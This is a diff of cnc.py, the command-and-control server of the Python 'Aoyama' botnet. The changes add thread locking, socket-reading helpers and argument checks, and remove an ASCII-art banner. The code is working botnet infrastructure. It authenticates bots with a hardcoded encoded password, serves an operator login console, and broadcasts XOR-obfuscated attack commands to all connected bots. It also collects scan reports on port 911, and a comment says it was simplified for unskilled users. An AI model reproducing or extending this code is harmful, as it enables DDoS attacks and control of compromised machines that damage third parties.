@@ -2,7 +2,7 @@
 # -*- coding: UTF-8 -*-
 #Code by LeeOn123
 #Created at 16/7/2019
-#Updaed at 9/1/2020
+#Updaed at 20/11/2020
 #############################################################
 #        d8888                                              #
 #       d88888                                              #
@@ -26,32 +26,49 @@ import sys
 import base64 as b64
 import random
 shutdown= False
+count = 0
+dead = 0
+socketList = []
 key= "asdfghjkloiuytresxcvbnmliuytf"#xor key
 
-if len(sys.argv)<=1:
-	print("Usage: python3 cnc.py <port>")
-	sys.exit()
+def ReadSocket(sock,length):
+	data = ""
+	while data == "":
+		data += sock.recv(length).decode().strip()
+	return data
 
-b = int(sys.argv[1])
-socketList = []
-def sent_command(count,dead,data,sock):
+def ReadLine(sock,length):
+	data = ""
+	while data[-4:] == "\r\n":
+		data += sock.recv(length).decode()
+	return data
+
+def SentCmd(data,sock,rlock):
+	global socketList
+	global count
+	global dead
+	rlock.acquire()
 	try:
 		sock.settimeout(1)
 		sock.send(data.encode())
-		count.append(".")
+		count += 1
 	except:
 		sock.close()
 		socketList.remove(sock)#del error connection
-		dead.append(".")
-def sendCmd(cmd):#Send Commands Module
+		dead += 1
+	rlock.release()
+
+def SendCmd(cmd,so,rlock):#Send Commands Module
+	global count
+	global dead
 	print('[*]Command sent!!!')#debug
 	print(cmd)
 	data = xor_enc(cmd,key)#encode
-	count = []
-	dead = []
+	count = 0
+	dead = 0
 	th_list = []
 	for sock in socketList:
-		th = threading.Thread(target=sent_command,args=(count,dead,data,sock))
+		th = threading.Thread(target=SentCmd,args=(count,dead,data,sock,rlock,))
 		th.start()
 		th_list.append(th)
 	for th in th_list:
@@ -60,12 +77,10 @@ def sendCmd(cmd):#Send Commands Module
 	dead = len(dead)
 	print("[!] "+str(dead)+" bots offline")
 	print(str(count)+" bots got the command")
-	global so
 	so.send((str(count)+" bots exec the command\r\n").encode())
-	scan_device()#check device after exec command
+	scan_device(rlock)#double check the bot connection status
 
-
-def scan_device():#scan online device
+def scan_device(rlock):#scan online device
 	print('scanning Online bot')
 	dead = 0
 	for sock in socketList:
@@ -81,26 +96,29 @@ def scan_device():#scan online device
 					pass
 				else:
 					sock.close()
+					rlock.acquire()
 					socketList.remove(sock)
+					rlock.release()
 					dead+= 1
 				print("[!] "+str(dead)+" bots offline")
 			except:
 				print("[!] The bot died")
 		except:
+			rlock.acquire()
 			socketList.remove(sock)#del error connection
+			rlock.release()
 			print("[!] A bot offline")#debug
 
-def showbot():#bot count
+def ShowBot(so):#bot count
 	while True:
 		try:
-			global so
 			so.send(("\033]0;Nodes : "+str(len(socketList))+" \007").encode())
 			time.sleep(1)
 		except:
 			return
 
-def handle_bot(sock,socketList):
-	code = len(socketList) + 1
+def handle_bot(sock,socketList,rlock):
+	#code = len(socketList) + 1
 	while True:
 		try:
 			sock.settimeout(1)
@@ -114,7 +132,9 @@ def handle_bot(sock,socketList):
 			else:
 				try:
 					sock.close()
+					rlock.acquire()
 					socketList.remove(sock)
+					rlock.release()
 					print("[!] A bot offline")
 					break
 				except:
@@ -122,43 +142,37 @@ def handle_bot(sock,socketList):
 		except:
 			try:#must try here because the bot may removed from other function
 				sock.close()
+				rlock.acquire()
 				socketList.remove(sock)
+				rlock.release()
 				print("[!] A bot offline")
 			except:#bug happened here, if not add "break" then there will be a "magic" loop
 				pass
 			break
 
-def waitConnect(sock,addr):
+def Verify(sock,addr,rlock):
 	try:
-		data = sock.recv(1024)#support telnet
-		try:
-			passwd = data.decode()
-			if passwd == "UEBXUQ==" :#1337 after encode
-				if sock not in socketList:
-					socketList.append(sock)
-					print("[!] A bot Online "+ str(addr)) #message
-					handle_bot(sock,socketList)
-			elif "\n" in passwd :
-				print("Somebody connected:"+str(addr))
-				Commander(sock)
-		except:
-			#removed Login code, more easy for skid
-			#If u are using putty pls use raw mode to connect,
-			#If connected, there will not show anything on screen
-			#Just click enter.
+		data = ReadSocket(sock,1024)#support telnet
+		print(data)
+		if data == "UEBXUQ==" :#1337 after encode
+			if sock not in socketList:
+				rlock.acquire()
+				socketList.append(sock)
+				rlock.release()
+				print("[!] A bot Online "+ str(addr)) #message
+				handle_bot(sock,socketList,rlock)
+		else:
 			print("Somebody connected:"+str(addr))
-			Commander(sock)
+			Commander(sock,rlock)
 	except:
 		sock.close()
 
-def Commander(sock):#cnc server
-	global so
-	so = sock
+def Commander(sock,rlock):#cnc server
 	try:
 		sock.send("Username:".encode())
-		name = sock.recv(1024).decode().strip()
+		name = ReadSocket(sock,1024)
 		sock.send("Password:".encode())
-		passwd = sock.recv(1024).decode().strip()
+		passwd = ReadSocket(sock,1024)
 	except:
 		print("// Someone try to break the server down in progress //")
 		return
@@ -212,19 +226,19 @@ def Commander(sock):#cnc server
 	sock.send(("[!] Welcom to the Aoyama C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
 	sock.send("==============================================\r\n".encode())
 	time.sleep(1)
-	threading.Thread(target=showbot,daemon=True).start()
+	threading.Thread(target=ShowBot,args=(sock,),daemon=True).start()
 
 
 	while True:
 		#print ("==> Python3 C&C server <==")
-		sock.send((str(name)+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
-		cmd_str = sock.recv(1024).decode().strip()
+		sock.send((str(name)+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why.
+		cmd_str = ReadSocket(sock,1024).lower()
 		if len(cmd_str):
 			if cmd_str[0] == '!':
-				sendCmd(cmd_str)
+				SendCmd(cmd_str,sock,rlock)
 				#sock.send(str(count)+"bots exec the command\r\n".encode())
 			if cmd_str == 'scan':
-				scan_device()
+				scan_device(rlock,)
 			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
 				#shell_exec()
 			if cmd_str == '?' or cmd_str == 'help':
@@ -265,7 +279,7 @@ def listen_scan():
 	lis.bind(('0.0.0.0',911))
 	lis.listen(1024)
 	while 1:
-		s, addr = lis.accept()
+		s, _ = lis.accept()
 		tmp = s.recv(1024).decode()
 		#print("Recevied something "+str(tmp))
 		try:
@@ -278,9 +292,8 @@ def listen_scan():
 			pass
 
 
-def main():
+def main(rlock):
 	threading.Thread(target=listen_scan,daemon=True).start()
-	global s
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
@@ -288,78 +301,45 @@ def main():
 	s.listen(1024)
 	while True:
 		sock, addr = s.accept()
-		threading.Thread(target=waitConnect,args=(sock,addr),daemon=True).start()
+		threading.Thread(target=Verify,args=(sock,addr,rlock,),daemon=True).start()
 
 def xor_enc(string,key):
-    lkey=len(key)
-    secret=[]
-    num=0
-    for each in string:
-        if num>=lkey:
-            num=num%lkey
-        secret.append( chr( ord(each)^ord(key[num]) ) )
-        num+=1
+	lkey=len(key)
+	secret=[]
+	num=0
+	for each in string:
+		if num>=lkey:
+			num=num%lkey
+		secret.append( chr( ord(each)^ord(key[num]) ) )
+		num+=1
 
-    return b64.b64encode( "".join( secret ).encode() ).decode()
+	return b64.b64encode( "".join( secret ).encode() ).decode()
 
 def xor_dec(string,key):
-    leter = b64.b64decode( string.encode() ).decode()
-    lkey=len(key)
-    string=[]
-    num=0
-    for each in leter:
-        if num>=lkey:
-            num=num%lkey
+	leter = b64.b64decode( string.encode() ).decode()
+	lkey=len(key)
+	string=[]
+	num=0
+	for each in leter:
+		if num>=lkey:
+			num=num%lkey
 
-        string.append( chr( ord(each)^ord(key[num]) ) )
-        num+=1
+		string.append( chr( ord(each)^ord(key[num]) ) )
+		num+=1
 
-    return "".join( string )
+	return "".join( string )
 
 if __name__ == '__main__':
-	threading.Thread(target=main,daemon=True).start()
+	if len(sys.argv) != 2:
+		print("Usage: python3 cnc.py <port>")
+		sys.exit()
+	try:
+		b = int(sys.argv[1])
+	except:
+		print("Port should be integer.")
+		sys.exit()
+	rlock = threading.Lock()
+	threading.Thread(target=main,args=(rlock,),daemon=True).start()
 	while 1:
 		if shutdown:
 			sys.exit()
-'''
-mmmmmddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddddddddddmmmddddddddddddddddddddddddddddddddddddddddd
-mdmmmdddddmmmmmmmmmmmmmmmmmmmmmmmmmmmdhso+/--....``....-:/+syhddddddddddddddddddddddddddddddddddddd
-ddddddddddddmmmmmmmmmmmmmmmmmmmmdys/-.`    ``.--------..`   ``.:+shdddddddddddddddddddddddddddddddd
-dddddddddddddddddddddddddmmmdhs/.`   `-:+oyhhhddddddddhhhyo+:.`   .:sdddddddddddddddddddddddddddddd
-ddddddddddddddddddddddddddhs:.   .:+yhddddddddddddddddddddddddhyo/-``-ydddddddddddddddddddddddddddd
-ddddddddddddddddddddddddy/.  `-+yhdddddddddddddddddddddddddddddddddhyoydddddddddddddddddddddddddddd
-ddddddddddddddddddddddy:`  .+yddddddddddddddddddddddddddddddddddddddddhyyhddddddddddddddddddddddddd
-dddddddmmmmmmdddddddh/`  -ohdddddddddddddddddddddddddddddddddddddddddddhyooyddddddddddddddddddddddd
-mmmmmdddmmmmmmmmmmdo.  .odddddddddddddddddddddddddddddddddddddddddhddddddh+:-sddddddddddddddddddddd
-mmmmmmmdmmmmmmmmmd/  `+ddddddddddddddddddddddddddddddddddddddddddhshdddddddo` :hddddddddddddddddddd
-mmmmmmmmmmmmmmmmh-  -ymmmdddyyddddddddddddddddddddddddddddddddddh/ysddddddddy- .sdddddddddddddddddd
-mmmmmmmmmmmmmmmh.  /dddddddd-`yddddddddddddddddddddddddddddddddd+/yodddddddddh: `/ddddddddddddddddd
-ddddddmmmmmmmmh.  /ddddddddd- .hddddddddddddddh/-+hdddddddddddds.hooddddddddddd/  :hddddddddddddddd
-ddddddddmmmddd-  /dddddddddho :/yyhddddddddddd`   `oddddddddddh-+hsohhhhhddddddd-  -ddddddddddddddd
-ddddddddddddd+  -dddddddddddd`:s+hhhhhddddddd: .    /dddddhhhh+-yyooyyyyhhddddddy`  /dddddddddddddd
-ddddddddddddh  `hdddddddddddd+sdoyyydddddddd+ /hs.   -yhhhhhhy:yhh/oyhhyyyyhhhhdd+   yddddddddddddd
-dddddddddddd/  +dddddddddddddhhdhss+yddddddy./hhhh/   `shhhhhsyhhh:shhhhhhyhhhhddh.  -ddddddddddddd
-dddddddddddd`  hdddddddddddddhhhdhyh/ohhhhhyyhhhdddo`  `+hddhhhhhh-yhhhhhhhhhhhhddo   ydddddddddddd
-ddddddddddds  -dddddddddddddddo+ddhsy.+ddhhhdddddddds.  -sddhddhhh.yhhhhhhhhhhhhddd`  +Nmmmdddddddd
-ddddddddddd+  /ddddddddddddddd-:dddhyy/sysyddddddddddh/`oyhhdddddh shddddddddddhmNN:  :NNNNmddmmmmm
-ddddddddddd+  oddddhdddddddddd/ hdddyyh+.sdddddddddddddo`syyhddddh +hdddddddddddmNN+  :NNNNmdmNNNNN
-ddddddddddd+  +dddddddddddddddy oddddy/ -dddddddddddddddy/.hdddddh oddhyssyhddmdmmmo  /NmNNmddNNNNN
-dddddddddddo  /dddddddddddddddd`-ddddy`.yyddddddddddddddd./dddyso+ ./++sydhdmmmmmmm-  sNNNNmddNNNNN
-dddddddddddh  .dddddddddddddddd- hddh`.+/syydddddddddhys:`+//+oyhs .dddddddmNNNNNmm  `mNNNNNddmmmmm
-dddddddddddd:  sddddddddddddddd: sds`.hd:`-.oso+/:-.-:/- +yhhddddo `dddddddmNNmmNN/  +NNNmmmddNNNNm
-ddddddddddddy  .ddddddddddddddd/ +o` /+:.    `:/+syhddy /dddddhhd/  dddddmmmNmmmNy``.mmNNmmNddNNmNN
-ddddddddddddd+  /dddddddddmmmdd: `   .-:+o`   sddddddd-`ddmmmmddd/.:ddmmmmmmmNmmd.  hNNNNNmmmdmNNmN
-ddddmddddddddd:  +ddddddmmNNNmmo` .yhdddddy`  `sddddds +ddddddddmdhdddmmmmmmmmNm-  oNNNNNmmmmdmmNNN
-dmNNNNNmddddmmd-  +mmdddmmNNmmmNhshddddddmmh.  `sdddd..dmmdmmmmmmmmmmmmmmmmmmmm+` +NNNNNNmmmmdmmNmm
-dNNmmNNmmmmmNmmd:  /mmmmmNNNNNNNmddddddmmmNNd.  `odd+ smmmmNNmmmmmmNNmmNmmNNNmo: +mNNNNNNmmmmdmmNNN
-mNmNNNNmmmmmNmmmd+  :dmmmmNNNNNNmmmmmmmmNmmmmh.  `os`.dmmmNNNNmmNmNNNNNmmmmNmo:`ommmmNNNNmmmmmmNNNN
-mNNNNNNmmmmmmmmmNmy. .smmNNNNNNNmmmNNmmmNNNNmmd:   ` smmNNmmNmmmNNNNmmmNmmmdo-.yNNNNmNmNNNNNmmmNNmN
-mNNNNNNmmmNNmmmmNNNd/  :hNNNNNNNNNNNNmmNNmNNNmNm+   `mNNmmmNmNmNNNNNmmmNmmhs:/dNNNmmmmNNNNNNNmmNNmN
-NNNNNNNNNNNmNNNmNNNNNy- `+dmNNNNNNNNNNNNNmmNNNNNms`./mNNNNNNNNNNNmNmmNNmhysohmNNNmNNNNNNNNmNNmmNmmN
-NNNNNNNNNNNNmNNNNNNNNNms- ./hmNNNNNNNNNNNNNNNNNNNNhdmNNNNNNNNNNNNmmmmmhyhydmNNNNNmNNmNmNNmmmNmmNNNN
-NNNmNmNNNNNNmNNNNNNNNNNmmy:`.+ydmNNNNNNNNNmNNNNNNNNNNmmNNmmNmmNNNmdhhhhddmNNNNmmmmNNmmmNNmmmNmmNNNN
-NNNmNNNNNNNNNNNNNNNNNmNmNNmh+--/oydmNNNNNNmNNNNNNmNNNmmmNmNNmNmmddhhdmNNNNNNNNmmNNNNNNmNNmmmNmmNNNN
-NNNNNNNNNNmNNNmmNNNNmmNNNNNNNmho:::+syhmmmmmNNNNNmNNNNNNmmmmmmmmmmNNNNNNNNNNNmNNmmmNNNmmNNmmmmNNNNN
-NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdy+:/+oyyhyhdddddmmmmdmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
-mNNNNNNNNNNNmNNNNNNNNNNNNNNmNNNNNNNNNmmdhdmmmmmmmmmmdyhNNNNNNmmmmNNNNNNmNNNNdmmNNmdmmNNNNNNNNNNNNNN
-'''
